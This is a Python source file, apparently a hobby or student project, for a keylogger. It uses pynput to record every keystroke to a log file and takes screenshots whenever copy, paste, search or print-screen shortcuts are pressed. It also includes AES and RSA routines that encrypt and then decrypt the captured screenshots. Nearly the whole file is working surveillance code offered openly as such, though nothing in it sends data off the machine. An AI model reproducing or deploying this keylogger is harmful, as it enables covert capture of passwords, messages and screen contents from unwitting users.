from pynput.keyboard import Listener
import pyautogui
import datetime
import time
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Hash import SHA512
from Crypto import Random
from Crypto.Util.Padding import pad, unpad

# keyloger
def keystroke(key):
    key = str(key).replace("'","")
       
    if key == "\\x03":
        key = "\nshortcut Copy\n"
        capturekey("_Copy")
    if key == "\\x16":
        key = "\nshortcut Paste\n"
        capturekey("_Paste")
    if key == "\\x06":
        key = "\nshortcut search\n"
        capturekey("_Search")
    if key == "Key.print_screen ":
        key = "\nprint screen\n"
        capturekey("_capture")
    if key == ("Key.ctrl_l") or key == ("Key.right") or key == ("Key.left") or key == ("Key.up") or key == ("Key.down") or key == ("Key.backspace") or key == ("Key.space") or key == ("Key.enter") or key == ("\\x13") or key == ("\\x01"):
        key = ''
    else:
        key += ' '
    
    # print(key)Temp\\

    with open("Temp/log_interrupt.txt", 'a') as f:
        f.write(key)

# capture
def capturekey(k):
    time.sleep(1.2)
    x = str(datetime.datetime.now().strftime("%d %b %Y_%H%M%S"))
    x = x + k + '.jpg'
    pyautogui.screenshot().save('Temp\\Capture\\'+x)
    # encrypt(x)

def encrypt(file):
    print("encrypt\n")
    with open(file, 'rb') as f:
        picture = f.read()
    
    picture = pad(picture,AES.block_size)

    print("picture : ",picture)

    aes_key = 'File_Generate/AESkey'
    with open(aes_key, 'rb') as f:
        k = f.read()
    
    cipher = AES.new(k, AES.MODE_CBC)
    data = cipher.encrypt(picture)
    datac = cipher.iv + data

    print("cipher : ",cipher)
    print("data : ",data)
    print("dataiv : ",datac)

    digest = SHA512.new()
    digest.update(datac)
    print("datac : ",digest.digest())
    
    pub = RSA.import_key(open('File_Generate/Public_Key.pem').read())
    pubkey = PKCS1_v1_5.new(pub)
    enc = pubkey.encrypt(digest.digest())

    with open(file, 'wb') as f:
        f.write(enc)
        f.write(datac)

    decrypt(file)
    
def decrypt(file):
    print("decrypt\n")
    aes_key = 'File_Generate/AESkey'
    with open(aes_key, 'rb') as f:
        k = f.read()

    with open(file, 'rb') as f:
        lock = f.read(256)
        text = f.read()

    files = 'decrypt' + file

    pvt = RSA.import_key(open('File_Generate/Private_Key.pem').read())
    pvtkey = PKCS1_v1_5.new(pvt)
    obj = pvtkey.decrypt(lock, Random.new().read)

    digest = SHA512.new()
    digest.update(text)
    print("text : ",digest.digest())

    if obj == digest.digest() :
        print("true")

        with open(files, 'wb') as f:
            f.write(text)

        with open(files, 'rb') as f:
            iv = f.read(16)
            data = f.read()
        cipher = AES.new(k, AES.MODE_CBC, iv)
        plaintext = cipher.decrypt(data)

        plaintext = unpad(plaintext, AES.block_size)

        with open(files, 'wb') as f:
            f.write(plaintext)

    else :
        print("false")


with Listener(on_press=keystroke) as l:
    l.join()
